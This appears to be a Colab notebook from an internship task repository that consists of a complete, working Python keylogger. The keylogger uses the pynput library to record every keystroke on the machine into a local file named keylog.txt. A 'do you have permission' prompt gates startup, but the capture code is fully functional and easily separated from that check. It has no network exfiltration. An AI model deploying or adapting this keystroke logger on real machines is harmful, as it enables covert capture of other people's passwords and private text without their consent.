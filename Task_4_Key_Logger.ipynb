{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyOBrlrGupyv7u93mJef8f8/",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/bharathwajks26/Prodigy_Infotech/blob/main/Task_4_Key_Logger.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "3PKUGOYAPwES"
      },
      "outputs": [],
      "source": [
        "#####################################################################################\n",
        "#THIS CODE WILL WORK ONLY IN COMMAND PROMPT\n",
        "#open cmd and type - (before make sure python is installled in cmd )\n",
        "# python file_name\n",
        "#####################################################################################\n",
        "\n",
        "\n",
        "import pynput.keyboard as keyboard\n",
        "import sys\n",
        "\n",
        "\n",
        "log_file = \"keylog.txt\"\n",
        "\n",
        "def on_press(key):\n",
        "    try:\n",
        "        with open(log_file, \"a\") as f:\n",
        "            f.write(f\"{key.char}\")\n",
        "    except AttributeError:\n",
        "        with open(log_file, \"a\") as f:\n",
        "            f.write(f\" {key} \")\n",
        "\n",
        "def main():\n",
        "    print(\"This script will log all keystrokes on this machine.\")\n",
        "    permission = input(\"Do you have permission to run this keylogger? (yes/no): \").strip().lower()\n",
        "\n",
        "    if permission != 'yes':\n",
        "        print(\"Permission not granted. Exiting...\")\n",
        "        sys.exit()\n",
        "\n",
        "    print(\"Keylogger is running. Press Ctrl + C to stop.\")\n",
        "\n",
        "    try:\n",
        "        with keyboard.Listener(on_press=on_press) as listener:\n",
        "            listener.join()\n",
        "    except KeyboardInterrupt:\n",
        "        print(\"\\nKeylogger stopped. Exiting...\")\n",
        "        sys.exit()\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "    main()\n"
      ]
    }
  ]
}